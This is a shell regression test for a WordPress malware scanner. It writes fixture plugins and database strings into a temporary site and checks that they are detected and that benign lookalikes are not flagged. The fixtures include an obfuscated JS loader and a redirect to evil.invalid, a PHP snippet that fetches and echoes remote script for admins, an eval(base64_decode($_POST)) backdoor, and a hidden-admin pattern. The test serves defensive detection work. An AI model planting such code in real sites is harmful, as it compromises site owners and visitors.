#!/usr/bin/env bash
set -euo pipefail
ROOTDIR="$(cd "$(dirname "$0")/.." && pwd)"
TMP="${TMPDIR:-/tmp}/presswarden-threat-intel.$$"
trap 'rm -rf "$TMP"' EXIT
SITE="$TMP/sites/example.com/public_html"
mkdir -p "$SITE/wp-admin" "$SITE/wp-content/plugins/malicious-js" "$SITE/wp-content/plugins/benign-js" "$SITE/wp-content/plugins/admin-target" "$SITE/wp-content/plugins/benign-admin" "$SITE/wp-includes"
touch "$SITE/wp-settings.php" "$SITE/wp-load.php"
printf '<?php $wp_version = "7.1";\n' > "$SITE/wp-includes/version.php"

cat > "$SITE/wp-content/plugins/malicious-js/loader.js" <<'JS'
(function(){var s=document.createElement('script');s.src=String.fromCharCode(104,116,116,112,115,58,47,47,101,118,105,108,46,105,110,118,97,108,105,100,47,120,46,106,115);document.head.appendChild(s);}());
JS
cat > "$SITE/wp-content/plugins/malicious-js/redirect.js" <<'JS'
var u=String.fromCharCode(104,116,116,112,115,58,47,47,101,118,105,108,46,105,110,118,97,108,105,100);window.location.href=u;
JS
cat > "$SITE/wp-content/plugins/benign-js/loader.js" <<'JS'
(function(){var decoded=atob('aGVsbG8=');console.log(decoded);var s=document.createElement('script');s.src='https://cdn.example.com/app.js';document.head.appendChild(s);}());
JS
cat > "$SITE/wp-content/plugins/benign-js/redirect.js" <<'JS'
window.location.href='/account';
JS

cat > "$SITE/wp-content/plugins/admin-target/payload.php" <<'PHP'
<?php
if (is_admin() && current_user_can('manage_options')) {
    $ua = $_SERVER['HTTP_USER_AGENT'];
    if (strpos($ua, 'Windows') !== false) {
        $r = wp_remote_get('https://example.invalid/payload');
        $js = base64_decode(wp_remote_retrieve_body($r));
        echo '<script>'.$js.'</script>';
    }
}
PHP
cat > "$SITE/wp-content/plugins/benign-admin/plugin.php" <<'PHP'
<?php
if (is_admin() && current_user_can('manage_options')) {
    wp_enqueue_script('plugin-admin', plugin_dir_url(__FILE__).'/admin.js', [], '1.0.0', true);
}
PHP

js_out=$(ROOT="$TMP/sites" PRESSWARDEN_CONFIG_FILE="$TMP/no-config" PRESSWARDEN_STATE_DIR="$TMP/state-js" PRESSWARDEN_CACHE_DIR="$TMP/cache-js" PRESSWARDEN_NOCOLOR=1 bash "$ROOTDIR/checks/js-threat-intel.sh" 2>&1 || true)
printf '%s\n' "$js_out" | grep -q 'PW-JS-002'
printf '%s\n' "$js_out" | grep -q 'malicious-js/loader.js'
printf '%s\n' "$js_out" | grep -q 'PW-JS-004'
printf '%s\n' "$js_out" | grep -q 'malicious-js/redirect.js'
if printf '%s\n' "$js_out" | grep -q 'benign-js/'; then
  printf '%s\n' "$js_out" >&2
  printf 'benign JavaScript lookalike was falsely flagged\n' >&2
  exit 1
fi

php_out=$(ROOT="$TMP/sites" PRESSWARDEN_CONFIG_FILE="$TMP/no-config" PRESSWARDEN_STATE_DIR="$TMP/state-php" PRESSWARDEN_CACHE_DIR="$TMP/cache-php" PRESSWARDEN_NOCOLOR=1 bash "$ROOTDIR/checks/php-threat-intel.sh" 2>&1 || true)
printf '%s\n' "$php_out" | grep -q 'PW-PHP-006'
printf '%s\n' "$php_out" | grep -q 'admin-target/payload.php'
if printf '%s\n' "$php_out" | grep -q 'benign-admin/plugin.php'; then
  printf '%s\n' "$php_out" >&2
  printf 'benign admin asset loader was falsely flagged\n' >&2
  exit 1
fi

php -r '
require $argv[1];
$tests = [
  [presswarden_db_classify_content("<script src=\"https://evil.invalid/x.js\"></script><script>eval(atob(\"QQ==\"))</script>", "option", "widget_text"), "PW-DB-001"],
  [presswarden_db_classify_content("<script src=\"https://cdn.example.com/app.js\"></script>", "option", "header_scripts"), "PW-DB-003"],
  [presswarden_db_classify_content("<?php eval(base64_decode(\$_POST[\"x\"]));", "post", "code"), "PW-DB-005"],
  [presswarden_db_classify_content("<script src=\"https://cdn.example.com/app.js\"></script>", "post", "page"), null],
  [presswarden_db_classify_admin("adminbackup", "adminbackup@wordpress.org"), "PW-DB-004"],
  [presswarden_db_classify_admin("deadbeefdeadbeefdeadbeefdeadbeef", "deadbeefdeadbeefdeadbeefdeadbeef@abcd.example"), "PW-DB-004"],
  [presswarden_db_classify_admin("siteowner", "owner@example.com"), null]
];
foreach ($tests as $i => $t) {
  $got = is_array($t[0]) ? $t[0][1] : null;
  if ($got !== $t[1]) { fwrite(STDERR, "DB classifier test $i failed\n"); exit(1); }
}
' "$ROOTDIR/lib/db-threat-classify.php"

awk -F'\t' 'BEGIN{bad=0} /^#/||NF==0{next} NF!=11{print "native rule metadata field mismatch at line " NR > "/dev/stderr";bad=1} END{exit bad}' "$ROOTDIR/intel/native-rules.tsv"
grep -q 'PW-CAMP-005' "$ROOTDIR/intel/campaigns.tsv"
grep -q 'PW-CAMP-006' "$ROOTDIR/intel/campaigns.tsv"
grep -q 'wp-db-malware' "$ROOTDIR/suites/db.sh"

printf 'PressWarden threat-intel regressions: PASS\n'
